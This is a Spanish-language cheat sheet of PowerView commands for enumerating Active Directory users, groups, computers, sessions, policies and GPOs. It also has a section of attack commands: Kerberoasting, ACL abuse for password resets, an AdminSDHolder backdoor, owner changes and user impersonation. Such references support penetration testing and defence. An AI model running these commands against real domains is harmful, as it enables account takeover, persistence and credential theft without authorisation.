
# Enumeración de usuarios y grupos
| *Función*                                                                        | *Comando*                                                                                                                                                                             |
| -------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Obtener todos los grupos a los que pertenece un usuario (recursivo hacia arriba) | `Get-DomainGroup -MemberIdentity <User/Group>`                                                                                                                                        |
| Obtener todos los miembros efectivos de un grupo (recursivo hacia abajo)         | `Get-DomainGroupMember -Identity "Domain Admins" -Recurse`                                                                                                                            |
| Obtener usuarios con credenciales alternativas                                   | `$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', (ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force)); Get-DomainUser -Credential $Cred` |
| Buscar usuarios por múltiples identificadores                                    | `'SID','DN','GUID','username' \| Get-DomainUser -Properties samaccountname,lastlogoff`                                                                                                |
| Obtener todos los usuarios                                                       | `Get-DomainUser`                                                                                                                                                                      |

# Enumeración avanzada de usuarios
| *Función*                                       | *Comando*                                                                                                                            |
| ----------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| Usuarios con contraseña antigua (>1 año)        | `$Date=(Get-Date).AddYears(-1).ToFileTime(); Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset` |
| Usuarios habilitados                            | `Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE`                                                                                       |
| Usuarios deshabilitados                         | `Get-DomainUser -UACFilter ACCOUNTDISABLE`                                                                                           |
| Usuarios que requieren smartcard                | `Get-DomainUser -UACFilter SMARTCARD_REQUIRED`                                                                                       |
| Usuarios sin smartcard                          | `Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname`                                                        |
| Usuarios con SPN (posibles cuentas de servicio) | `Get-DomainUser -SPN`                                                                                                                |
| Usuarios sin preautenticación Kerberos          | `Get-DomainUser -UACFilter DONT_REQ_PREAUTH`                                                                                         |
| Usuarios con sidHistory                         | `Get-DomainUser -LDAPFilter '(sidHistory=*)'`                                                                                        |
# Enumeración de equipos
| *Función*                             | *Comando*                                                                                                                |
| ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| Obtener equipos en una OU             | `Get-DomainComputer -SearchBase "ldap://OU=..."`                                                                         |
| Equipos con delegación no restringida | `Get-DomainComputer -Unconstrained`                                                                                      |
| Equipos con constrained delegation    | `Get-DomainComputer -TrustedToAuth`                                                                                      |
| Convertir nombres a FQDN              | `gc computers.txt \| % {Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_)" -Properties dnshostname}` |

# Enumeración de redes y sesiones
| *Función*                                  | *Comando*                                                               |
| ------------------------------------------ | ----------------------------------------------------------------------- |
| Ver usuarios logueados en máquinas         | `Get-NetLoggedOn -ComputerName <host>`                                  |
| Obtener grupos locales de un equipo remoto | `Get-NetLocalGroup SERVER.domain.local`                                 |
| Obtener miembros de grupo local (rápido)   | `Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local` |
| Buscar usuarios en máquinas con delegación | `Find-DomainUserLocation -ComputerUnconstrained -ShowAll`               |

# Enumeración del dominio y políticas
| *Función*                    | *Comando*                                         |
| ---------------------------- | ------------------------------------------------- |
| Obtener Global Catalogs      | `Get-ForestGlobalCatalog`                         |
| Obtener política del dominio | `$DomainPolicy = Get-DomainPolicy -Policy Domain` |
| Ver política Kerberos        | `$DomainPolicy.KerberosPolicy`                    |
| Ver política de contraseñas  | `$DomainPolicy.SystemAccess`                      |
| Política del DC              | `$DCPolicy = Get-DomainPolicy -Policy DC`         |

# Delegación y privilegios
| *Función*                                    | *Comando*                                                             |
| -------------------------------------------- | --------------------------------------------------------------------- |
| Ver máquinas donde un usuario es admin local | `Get-DomainGPOUserLocalGroupMapping -Identity <User>`                 |
| Ver acceso RDP de un usuario                 | `Get-DomainGPOUserLocalGroupMapping -Identity <USER> -LocalGroup RDP` |
| Exportar GPOs a CSV                          | `Get-DomainGPOUserLocalGroupMapping \| Export-CSV gpo_map.csv`        |
| GPO aplicadas a una máquina                  | `Get-DomainGPO -ComputerIdentity <host>`                              |

# Búsqueda y descubrimiento
| *Función*                                | *Comando*                                                                |
| ---------------------------------------- | ------------------------------------------------------------------------ |
| Buscar archivos interesantes en shares   | `Find-InterestingDomainShareFile -Domain DOMAIN -Credential $Credential` |
| Buscar equipos con propiedades anómalas  | `Get-DomainComputer -FindOne \| Find-DomainObjectPropertyOutlier`        |
| Buscar usuarios en Domain Admins con SPN | `Get-DomainUser -SPN \| ?{$_.memberof -match 'Domain Admins'}`           |

# Ataque / Abuso
| *Función*                                | *Comando*                                                                                        |
| ---------------------------------------- | ------------------------------------------------------------------------------------------------ |
| Kerberoasting en una OU                  | `Invoke-Kerberoast -SearchBase "LDAP://OU=..."`                                                  |
| Añadir permisos para resetear contraseña | `Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword`         |
| Backdoor AdminSDHolder                   | `Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,...' -PrincipalIdentity matt -Rights All` |
| Cambiar propietario de objeto            | `Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y`                                     |
| Modificar propiedades de usuario         | `Set-DomainObject testuser -Set @{...}`                                                          |

# Relaciones entre dominios
| *Función*                                    | *Comando*                                                                                      |
| -------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| Enumerar usuarios extranjeros (cross-domain) | `Get-DomainObject -SearchBase "GC://..." -LDAPFilter '(objectclass=foreignSecurityPrincipal)'` |
# Persistencia y utilidades
| *Función*                   | *Comando*                                    |
| --------------------------- | -------------------------------------------- |
| Exportar usuarios a XML     | `Get-DomainUser \| Export-Clixml user.xml`   |
| Importar usuarios desde XML | `$Users = Import-Clixml user.xml`            |
| Impersonar usuario          | `Invoke-UserImpersonation -Credential $Cred` |
| Revertir impersonación      | `Invoke-RevertToSelf`                        |